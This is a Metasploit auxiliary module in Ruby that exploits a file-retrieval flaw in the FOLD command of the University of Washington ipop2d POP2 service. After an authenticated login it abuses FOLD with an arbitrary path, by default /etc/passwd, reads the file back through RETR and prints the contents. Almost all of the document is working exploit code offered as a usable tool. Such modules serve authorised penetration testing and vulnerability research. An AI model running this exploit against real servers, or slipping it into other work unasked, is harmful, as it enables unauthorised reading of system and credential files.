##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Pop2

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'UoW pop2d Remote File Retrieval Vulnerability',
      'Description'    => %q{
        This module exploits a vulnerability in the FOLD command of the
        University of Washington ipop2d service. By specifying an arbitrary
        folder name it is possible to retrieve any file which is world or group
        readable by the user ID of the POP account. This vulnerability can only
        be exploited with a valid username and password. The From address is
        the file owner.
      },
      'Author'         => [ 'aushack' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '368' ],
          [ 'BID', '1484' ],
        ],
      'DisclosureDate' => 'Jul 14 2000'))

    register_options(
      [
        OptString.new('FILE', [ true, "The file to retrieve", '/etc/passwd' ])
      ])
  end

  def run
    connect_login
    file = datastore['FILE']
    res = send_cmd( ['FOLD', file] , true)

    if (res =~ /#1 messages in/)
      send_cmd( ['READ 1'] , true)
      file_output = send_cmd( ['RETR'] , true)
      print_status("File output:\r\n\r\n#{file_output}\r\n")
      send_cmd( ['ACKS'] , true)
    elsif (res =~ /#0 messages in/)
      print_status("File #{file} not found or read-access is denied.")
    end

    send_cmd( ['QUIT'] , true)
    disconnect
  end
end
